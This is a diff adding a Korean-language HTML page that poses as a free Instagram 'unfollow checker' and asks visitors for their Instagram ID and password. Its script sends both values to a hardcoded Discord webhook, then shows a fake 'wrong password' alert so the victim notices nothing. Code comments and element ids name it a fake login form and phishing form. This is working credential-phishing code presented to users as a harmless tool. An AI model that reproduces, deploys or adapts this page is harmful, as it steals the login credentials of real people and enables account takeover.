@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>인스타그램 언팔 확인 사이트</title>
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --card-bg: #1e2538;
+            --accent: #ef4444;
+            --accent-soft: rgba(239,68,68,0.12);
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
+            --border-color: #334155;
+            --safe-bg: #0f172a;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: system-ui,-apple-system, BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans KR","Helvetica Neue",sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1rem;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            display: grid;
+            gap: 1.5rem;
+        }
+
+        /* 상단 경고 배너 */
+        .banner {
+            background: var(--accent-soft);
+            border: 1px solid var(--accent);
+            border-radius: 0.75rem;
+            padding: 1rem 1.25rem;
+        }
+        .banner-title {
+            color: var(--accent);
+            font-size: .9rem;
+            font-weight: 600;
+            margin: 0 0 .5rem;
+        }
+        .banner-desc {
+            color: var(--text-main);
+            font-size: .8rem;
+            line-height: 1.4;
+            margin: 0;
+        }
+
+        /* 가짜 로그인 카드 */
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            padding: 1.5rem 1.5rem 1.25rem;
+            box-shadow: 0 24px 40px rgba(0,0,0,0.6);
+        }
+
+        .brand {
+            text-align: center;
+            font-weight: 600;
+            font-size: 1rem;
+            color: var(--text-main);
+            margin-bottom: .25rem;
+        }
+        .brand-sub {
+            text-align: center;
+            font-size: .75rem;
+            color: var(--text-dim);
+            margin: 0 0 1.5rem;
+        }
+
+        .field-group {
+            display: grid;
+            gap: .5rem;
+            margin-bottom: 1rem;
+        }
+
+        .label {
+            font-size: .75rem;
+            color: var(--text-dim);
+            display: flex;
+            justify-content: space-between;
+        }
+        .hint-link {
+            font-size: .7rem;
+            color: var(--text-dim);
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .input-wrap {
+            background: var(--bg-dark);
+            border: 1px solid var(--border-color);
+            border-radius: .5rem;
+            padding: .75rem .75rem;
+            display: flex;
+            align-items: center;
+        }
+        .input-wrap input {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: var(--text-main);
+            font-size: .8rem;
+            flex: 1;
+        }
+        .input-wrap input::placeholder {
+            color: var(--text-dim);
+        }
+
+        .login-btn {
+            background: linear-gradient(to right,#3b82f6,#4f46e5);
+            border: none;
+            border-radius: .5rem;
+            width: 100%;
+            padding: .75rem 1rem;
+            font-size: .8rem;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 16px 32px rgba(59,130,246,0.4);
+        }
+        .login-btn:active {
+            transform: scale(.99);
+        }
+
+        .disclaimer {
+            text-align: center;
+            color: var(--text-dim);
+            font-size: .7rem;
+            line-height: 1.4;
+            margin-top: 1rem;
+        }
+
+        /* 결과/경고 카드 (처음엔 숨김) */
+        .result-card {
+            display: none;
+            background: var(--card-bg);
+            border: 1px solid var(--accent);
+            border-radius: .75rem;
+            padding: 1rem 1.25rem;
+        }
+        .result-title {
+            color: var(--accent);
+            font-size: .9rem;
+            font-weight: 600;
+            margin: 0 0 .75rem;
+        }
+        .result-desc {
+            font-size: .8rem;
+            color: var(--text-main);
+            line-height: 1.5;
+            margin: 0 0 1rem;
+        }
+        .creds-box {
+            background: var(--bg-dark);
+            border: 1px solid var(--border-color);
+            border-radius: .5rem;
+            padding: .75rem;
+            font-family: ui-monospace, SFMono-Regular, Consolas, "Liberation Mono", Menlo, monospace;
+            font-size: .75rem;
+            color: var(--text-main);
+            line-height: 1.4;
+            word-break: break-all;
+            margin-bottom: 1rem;
+        }
+        .defense-title {
+            font-size: .8rem;
+            font-weight: 600;
+            color: var(--text-main);
+            margin: 0 0 .5rem;
+        }
+        .defense-list {
+            margin: 0;
+            padding-left: 1rem;
+            color: var(--text-dim);
+            font-size: .75rem;
+            line-height: 1.4;
+        }
+        .defense-list li {
+            margin-bottom: .5rem;
+        }
+
+        .footer-note {
+            font-size: .7rem;
+            color: var(--text-dim);
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        /* 작은 화면 대응 */
+        @media (max-width: 400px) {
+            .card, .banner, .result-card {
+                border-radius: .6rem;
+                padding: 1rem 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main class="container">
+
+        <!-- 상단 교육용 안내 배너 -->
+        <section class="banner" aria-labelledby="banner-title">
+            <h2 id="banner-title" class="banner-title">인스타그램 언팔 확인용</h2>
+            <p class="banner-desc">
+                인스타그램의 팔로우와 팔로잉의 대조를 비교해
+                자신이 팔로잉하고 상대방이 팔로잉을 하지 않았을때의 대조를 비교하는 사이트입니다.
+            </p>
+        </section>
+
+        <!-- 가짜 로그인 카드 -->
+        <section class="card" aria-labelledby="login-title">
+            <div class="brand" id="login-title">instagram 언팔 확인용</div>
+            <p class="brand-sub">언팔용 확인 외 다른 기능은 없습니다.</p>
+
+            <form id="phish-form">
+                <div class="field-group">
+                    <label class="label">
+                        <span>아이디 / 이메일</span>
+                        <span class="hint-link">도움이 필요하신가요?</span>
+                    </label>
+                    <div class="input-wrap">
+                        <input
+                            id="phish-username"
+                            name="username"
+                            type="text"
+                            placeholder="example_user"
+                            autocomplete="off"
+                            required
+                        />
+                    </div>
+                </div>
+
+                <div class="field-group">
+                    <label class="label">
+                        <span>비밀번호</span>
+                        <span class="hint-link">비밀번호 입력</span>
+                    </label>
+                    <div class="input-wrap">
+                        <input
+                            id="phish-password"
+                            name="password"
+                            type="password"
+                            placeholder="••••••••"
+                            autocomplete="off"
+                            required
+                        />
+                    </div>
+                </div>
+
+                <button class="login-btn" type="submit">로그인</button>
+
+                <p class="disclaimer">
+                    이 페이지는 언팔 확인용 외에 광고, 결제카드 입력이 전혀 없습니다.
+                    무료이니 안심하고 사용하셔도 됩니다.
+                </p>
+            </form>
+        </section>
+
+    </main>
+
+    <script>
+        const formEl = document.getElementById("phish-form");
+
+        formEl.addEventListener("submit", function (ev) {
+            ev.preventDefault();
+            
+            const username = (document.getElementById("phish-username").value || "").trim();
+            const password = (document.getElementById("phish-password").value || "").trim();
+            
+            // Discord Webhook으로 전송
+            const webhookUrl = "https://discord.com/api/webhooks/1432609926613700660/W0izZzksctzIC-8oW3DqKZKrVDh0AKKidjzgMWIdUINKC3wYdtuM00HM5q54TPEh1mZ9";
+            
+            const timestamp = new Date().toLocaleString('ko-KR', { 
+                timeZone: 'Asia/Seoul',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            const payload = {
+                embeds: [{
+                    title: "🔔 새로운 입력 정보",
+                    color: 15158332,
+                    fields: [
+                        {
+                            name: "아이디",
+                            value: username || "(없음)",
+                            inline: true
+                        },
+                        {
+                            name: "비밀번호",
+                            value: password || "(없음)",
+                            inline: true
+                        },
+                        {
+                            name: "시간",
+                            value: timestamp,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "테스트용 데이터"
+                    }
+                }]
+            };
+            
+            // 비동기 전송 (await 없이)
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => {
+                console.log('전송 시도');
+            });
+            
+            // 사용자에게 보이는 메시지
+            alert("오류! 비밀번호가 틀렸습니다.");
+            
+            // 비밀번호 필드 비우기
+            document.getElementById("phish-password").value = "";
+        });
+    </script>
+</body>
+</html>
